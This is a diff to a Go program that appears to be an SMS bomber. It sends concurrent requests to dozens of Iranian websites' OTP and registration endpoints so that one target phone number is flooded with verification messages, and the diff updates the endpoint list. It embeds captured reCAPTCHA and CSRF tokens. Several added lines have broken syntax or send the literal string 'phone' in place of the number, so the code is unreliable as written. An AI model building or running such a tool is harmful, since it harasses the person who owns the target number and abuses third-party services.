@@ -305,7 +305,11 @@ func main() {
 		}, ch)  
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+				s2 := fmt.Sprintf("'userKey':'98-'%s ,'userKeyType': 1", phone)
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			s2: phone,
+		}, ch)
+                go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)   // just check
 		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
@@ -481,131 +485,83 @@ func main() {
 		go sms("https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://server.uphone.ir/api/v1/login/otp/request", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch)
-		go sms("https://www.glite.ir/wp-admin/admin-ajax.php", map[string]interface{}{
-			"action=logini_first&login": phone,
-		}, ch)
-		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
-			"phone": phone,
-		}, ch)
-		go sms("https://api.offch.com/auth/otp", map[string]interface{}{
-			"username": phone,
-		}, ch)
-		go sms("https://sandbox.sibbazar.com/api/v1/user/invite", map[string]interface{}{
-			"username": phone,
-		}, ch)
-		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)
+		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // edit :4/22/2025
 		s1 := fmt.Sprintf("'phoneNumber':%s ,'email':''", phone)
 		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
 			s1: phone,
-		}, ch)
-		s2 := fmt.Sprintf("'userKey':'98-'%s ,'userKeyType': 1", phone)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			s2: phone,
-		}, ch)
-		s3 := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
-		go sms("https://shadmessenger12.iranlms.ir/", map[string]interface{}{
-			s3: phone,
-		}, ch)
-		s4 := fmt.Sprintf("'grant_type':'otp','client_id':'62b30c4af53e3b0cf100a4a0','phone': %s", phone)
-		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
-			s4: phone,
-		}, ch)
-		s8 := fmt.Sprintf("'operationName':'Mutation','variables':{'content':{'phone_number':%s,query':'mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}'", phone)
-		go sms("https://apollo.digify.shop/graphql", map[string]interface{}{
-			s8: phone,
-		}, ch)
-		go sms(fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{
-			"monsmain": "phone",
-		}, ch)
-		s10 := fmt.Sprintf("'mobile': %s, 'country_code': 'IR', 'provider_code': 'RUBIKA'", phone)
-		go sms("https://api.chartex.net/api/v2/user/validate", map[string]interface{}{
-			s10: phone,
-		}, ch)
-		s11 := fmt.Sprintf("'lang': 'fa', 'country_id': '860', 'password': 'snaptrippass', 'mobile_phone': %s, 'country_code': '+98', 'email': 'example@gmail.com'}", phone)
-		go sms("https://www.snapptrip.com/register", map[string]interface{}{
-			s11: phone,
-		}, ch)
+		}, ch) // just check
+		go sms("https://www.glite.ir/wp-admin/admin-ajax.php", map[string]interface{}{
+			"mobileemail": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://www.offch.com/login", map[string]interface{}{
+			"1_username": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{
+			"username": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&lat=35.774&long=51.418", map[string]interface{}{
+			"cellphone": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
+			"phone_number": phone,
+		}, ch)  // edit :4/22/2025
+		go sms(fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=", phone), map[string]interface{}{
+			"mobile": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
+			"phoneNumber": "phone",
+		}, ch)  // edit :4/22/2025
 		go sms(fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone), map[string]interface{}{
 			"monsmain": "monsmain",
-		}, ch)
-		s13 := fmt.Sprintf("'phone': %s,'captcha_token': ''", phone)
-		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
-			s13: phone,
-		}, ch)
-		s14 := fmt.Sprintf("'mobile': %s,'origin': '/'','referrer_id': ''", phone)
-		go sms("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
-			s14: phone,
-		}, ch)
-		s16 := fmt.Sprintf("'mobile':%s,'side':'web'", phone)
-		go sms("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
-			s16: phone,
-		}, ch)
-		go sms(fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", phone), map[string]interface{}{
-			"monsmain": "monsmain",
-		}, ch)
-		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
-			"UserName": phone,
-		}, ch)
-		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
-			"contact": phone,
-		}, ch)
-		go sms(fmt.Sprintf("https://core.gap.im/v1/user/add.json?mobile=%2B%s", phone), map[string]interface{}{
-			"monsmain": "monsmain",
-		}, ch)
-		s18 := fmt.Sprintf("'cellNumber': %s, 'device': {'deviceId': 'a16e6255-17c3-431b-b047-3f66d24c286f', 'deviceModel': 'WEB_BROWSER', 'deviceAPI': 'WEB_BROWSER', 'osName': 'WEB'}", phone)
-		go sms("https://app.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
-			s18: phone,
-		}, ch)
-		s19 := fmt.Sprintf("'phone': %s, 'recaptcha-response': '03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg','token': 'e622c330c77a17c8426e638d7a85da6c2ec9f455'}, headers={'Host': 'gateway.wisgoon.com','content-length': '582','accept': 'application/json','save-data': 'on','content-type': 'application/json','origin': 'https://m.wisgoon.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.wisgoon.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7'", phone)
+		}, ch) // i don't know??
+		go sms("https://api.bitpin.org/v3/usr/authenticate/", map[string]interface{}{
+			"phone": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://www.chamedoun.com/auth/sms/send-login-otp", map[string]interface{}{
+			"phone": "phone"
+		}, ch)  // edit :4/22/2025
+		go sms(fmt.Sprintf("https://api.torob.com/v4/user/phone/send-pin/?phone_number=", phone), map[string]interface{}{
+			"phone_number": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
+			"UserName": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://core.gap.im/v1/user/sendOTP.gap"), map[string]interface{}{
+			"mobile­": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
+			"cellNumber": "phone",
+		}, ch)  // edit :4/22/2025
 		go sms("https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{
-			s19: phone,
-		}, ch)
-		s20 := fmt.Sprintf("utf8=%E2%9C%93&phone_number=%s&g-recaptcha-response=", phone)
+			"phone": "phone"
+		}, ch)  // edit :4/22/2025
 		go sms("https://tagmond.com/phone_number", map[string]interface{}{
-			s20: phone,
-		}, ch)
-		s21 := fmt.Sprintf("'mobile': %s, 'country_id': 205", phone)
+			"phone_number": "phone",
+		}, ch)  // edit :4/22/2025
 		go sms("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
-			s21: phone,
-		}, ch)
-		s22 := fmt.Sprintf("'user': phone, 'app_id': 99", phone)
-		go sms("https://api.anargift.com/api/people/auth", map[string]interface{}{
-			s22: phone,
-		}, ch)
-		go sms(fmt.Sprintf("https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B'phoneNumber':'azki_%v'%7D", phone), map[string]interface{}{
-			"monsmain": "monsmain",
-		}, ch)
-		s23 := fmt.Sprintf("'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': %s,'password': 'ibvvb@3#9nc'", phone)
-		go sms("https://lendo.ir/register?", map[string]interface{}{
-			s23: phone,
-		}, ch)
-		s24 := fmt.Sprintf("'contactInfo[mobile]': %s,'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'", phone)
-		go sms("https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox", map[string]interface{}{
-			s24: phone,
-		}, ch)
-		s25 := fmt.Sprintf("'action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'", phone)
-		go sms("https://www.pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{
-			s25: phone,
-		}, ch)
+			"mobile­": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms"https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
+			"phoneNumber": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
+			"mobile­": "phone",
+		}, ch)  // edit :4/22/2025
+		go sms("https://pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{
+			"phone": "phone"
+		}, ch)  // edit :4/22/2025
 		s27 := fmt.Sprintf("'mobile': %s,'action': 'sendsms'", phone)
-		go sms("https://crm.see5.net/api_ajax/sendotp.php", map[string]interface{}{
-			s27: phone,
-		}, ch)
-		s28 := fmt.Sprintf("'mobileNumber': %s,'ReSendSMS': 'False'", phone)
-		go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
-			s28: phone,
-		}, ch)
+		go sms("https://see5.net/phonenumberHandler.php", map[string]interface{}{
+			"phone": "phone"
+		}, ch)  // edit :4/22/2025
+		go sms("https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
+			"mobileNumber": "phone",
+		}, ch)  // edit :4/22/2025
 		s29 := fmt.Sprintf("'mobileNumber': %s,'country': '1'", phone)
 		go sms("https://my.limoome.com/api/auth/login/otp", map[string]interface{}{
 			s29: phone,
